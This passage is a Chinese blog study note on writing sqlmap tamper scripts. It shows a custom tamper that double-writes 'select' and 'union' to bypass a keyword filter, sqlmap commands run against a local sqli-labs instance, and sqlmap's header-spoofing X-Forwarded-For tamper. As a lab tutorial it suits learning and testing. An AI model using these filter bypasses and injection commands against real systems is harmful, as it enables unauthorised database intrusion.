<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;这是我的tamper提示&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p><img src="20191118212606.png" alt="20191118212606"></p>
<p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个<code>\sqlmap\lib\core\enums.py</code> <img src="20191118212624.png" alt="20191118212624"></p>
<p>Tamper</p>
<p>tamper这个函数是tamper最重要的函数，你要实现的功能，全部写在这个函数里。payload这个参数就是sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个payload的修改。kwargs是针对http头部的修改，如果你bypass，是通过修改http头，就需要用到这个</p>
<p>基于payload</p>
<p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图 <img src="20191118212641.png" alt="20191118212641"></p>
<p>编写tamper来双写绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql</span><br></pre></td></tr></table></figure>

<p><img src="20191118212702.png" alt="20191118212702"></p>
<p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql</span><br></pre></td></tr></table></figure>

<p><img src="20191118212747.png" alt="20191118212747"></p>
<p>payload正常双写，可以注入 <img src="20191118212800.png" alt="20191118212800"></p>
<p>基于http头</p>
<p>我们使用<code>sqlmap\tamper\xforwardedfor.py</code>的tamper来讲解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>从<code>kwargs</code>中取出<code>headers</code>数组，然后修改了xff值达到随机IP的效果，不再赘述</p>
<p>参考</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/">http://example.com/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post_share"><div class="social-share" data-image="/imgg/10.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/"><img class="prev-cover" src="/imgg/10.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">mysql注入一些点的总结</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><img class="next-cover" src="/imgg/10.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">mysql学习记录</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/" title="Mysqludf提权"><img class="cover" src="/imgg/10.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-06</div><div class="title">Mysqludf提权</div></div></a></div><div><a href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="mysql学习记录"><img class="cover" src="/imgg/10.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-27</div><div class="title">mysql学习记录</div></div></a></div><div><a href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/" title="mysql注入一些点的总结"><img class="cover" src="/imgg/10.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-06</div><div class="title">mysql注入一些点的总结</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">SQL注入总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql-load-file%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">mysql load_file使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#loacte"><span class="toc-number">3.</span> <span class="toc-text">loacte()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlmap-Tamper-%E7%BC%96%E5%86%99"><span class="toc-number">4.</span> <span class="toc-text">Sqlmap Tamper 编写</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022"><img src="/imgg/1.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GeekChallenge2022"/></a><div class="content"><a class="title" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022">GeekChallenge2022</a><time datetime="2022-11-26T12:22:29.000Z" title="Created 2022-11-26 20:22:29">2022-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/" title="Mysqludf提权"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mysqludf提权"/></a><div class="content"><a class="title" href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/" title="Mysqludf提权">Mysqludf提权</a><time datetime="2022-01-06T06:36:42.000Z" title="Created 2022-01-06 14:36:42">2022-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/" title="mysql注入一些点的总结"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql注入一些点的总结"/></a><div class="content"><a class="title" href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/" title="mysql注入一些点的总结">mysql注入一些点的总结</a><time datetime="2022-01-06T02:06:53.000Z" title="Created 2022-01-06 10:06:53">2022-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/" title="mysql注入简单总结"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql注入简单总结"/></a><div class="content"><a class="title" href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/" title="mysql注入简单总结">mysql注入简单总结</a><time datetime="2022-01-01T08:29:27.000Z" title="Created 2022-01-01 16:29:27">2022-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="mysql学习记录"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mysql学习记录"/></a><div class="content"><a class="title" href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="mysql学习记录">mysql学习记录</a><time datetime="2021-12-27T06:36:27.000Z" title="Created 2021-12-27 14:36:27">2021-12-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>